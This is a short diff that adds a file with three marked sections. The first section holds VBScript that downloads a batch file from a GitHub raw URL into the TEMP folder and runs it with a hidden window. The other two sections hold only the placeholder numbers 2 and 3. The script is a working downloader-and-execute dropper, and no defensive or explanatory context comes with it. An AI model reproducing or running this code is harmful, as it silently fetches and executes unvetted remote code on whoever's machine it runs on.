@@ -1,0 +1,19 @@
+--trunk1open--
+Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
+h.Open "GET", "https://raw.githubusercontent.com/chotaacc/newss/main/puree.bat", False
+h.Send
+p = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\puree.bat"
+Set s = CreateObject("ADODB.Stream")
+s.Open
+s.Type = 1
+s.Write h.ResponseBody
+s.SaveToFile p, 2
+s.Close
+CreateObject("WScript.Shell").Run p, 0, True
+--trunk1close--
+--trunk2open--
+2
+--trunk2close--
+--trunk3open--
+3
+--trunk3close--
